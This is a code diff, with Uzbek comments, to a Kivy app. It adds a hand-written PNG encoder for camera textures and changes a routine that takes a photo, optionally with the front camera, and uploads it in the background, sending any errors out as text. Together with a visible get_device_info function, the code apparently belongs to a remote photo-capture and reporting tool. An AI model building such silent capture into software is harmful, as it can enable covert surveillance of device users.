@@ -101,7 +101,37 @@ def get_device_info():
         return "Qurilma info xatolik: " + str(e)
 
 
-# ─── KAMERA (Kivy Camera widget) ───────────────────────────────
+# ─── TEXTURE → PNG (PIL talab qilmaydi) ──────────────────────────────
+def _save_texture_png(texture, filepath):
+    """Kivy texture dan RGB PNG yaratish (faqat stdlib)"""
+    import struct
+    import zlib
+    pixels = bytes(texture.pixels)   # RGBA bytes
+    w, h   = texture.size
+
+    # RGBA → RGB
+    rgb = bytearray()
+    for i in range(0, len(pixels), 4):
+        rgb.extend(pixels[i:i + 3])
+
+    # Kivy texturelar teskari (OpenGL: pastdan yuqoriga), to'g'irlaymiz
+    row = w * 3
+    rows = [b'\x00' + bytes(rgb[y * row:(y + 1) * row])
+            for y in range(h - 1, -1, -1)]
+
+    compressed = zlib.compress(b''.join(rows), 6)
+
+    def chunk(name, data):
+        c = name + data
+        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
+
+    with open(filepath, 'wb') as f:
+        f.write(b'\x89PNG\r\n\x1a\n')
+        f.write(chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)))
+        f.write(chunk(b'IDAT', compressed))
+        f.write(chunk(b'IEND', b''))
+
+
 def take_photo_kivy(front_camera):
     try:
         from kivy.uix.camera import Camera as KivyCam
@@ -126,23 +156,25 @@ def take_photo_kivy(front_camera):
 
         def capture(dt):
             attempts[0] += 1
-            # Texture tayyor bo'lguncha kutamiz (max 5 urinish)
-            if cam.texture is None and attempts[0] < 5:
-                status[0] = 'Kamera kutilmoqda... (' + str(attempts[0]) + ')'
+            texture = cam.texture
+            if texture is None and attempts[0] < 6:
+                status[0] = 'Texture kutilmoqda... (' + str(attempts[0]) + ')'
                 Clock.schedule_once(capture, 1.0)
                 return
             try:
-                cam.export_to_png(filepath)
+                if texture is not None:
+                    # export_to_png emas — to'g'ridan texture.pixels o'qiymiz!
+                    _save_texture_png(texture, filepath)
                 cam.play = False
                 app_ref[0].root.remove_widget(cam)
-                if os.path.exists(filepath) and os.path.getsize(filepath) > 500:
+                fsize = os.path.getsize(filepath) if os.path.exists(filepath) else 0
+                if fsize > 5000:
                     threading.Thread(
                         target=upload_file_sync, args=(filepath, 'photo'), daemon=True
                     ).start()
-                    status[0] = 'Rasm olindi, yuborilmoqda...'
+                    status[0] = 'Rasm olindi (' + str(fsize // 1024) + ' KB), yuborilmoqda...'
                 else:
-                    size = os.path.getsize(filepath) if os.path.exists(filepath) else 0
-                    msg = 'Rasm bo\'sh (' + str(size) + ' bayt) | texture=' + str(cam.texture)
+                    msg = 'Rasm juda kichik: ' + str(fsize) + ' bayt'
                     status[0] = msg
                     threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
             except Exception as ex:
@@ -150,7 +182,7 @@ def take_photo_kivy(front_camera):
                 status[0] = msg
                 threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
 
-        Clock.schedule_once(capture, 3.0)  # 3 soniya kutish
+        Clock.schedule_once(capture, 3.0)
 
     except Exception as e:
         msg = 'Kamera xatolik: ' + str(e)
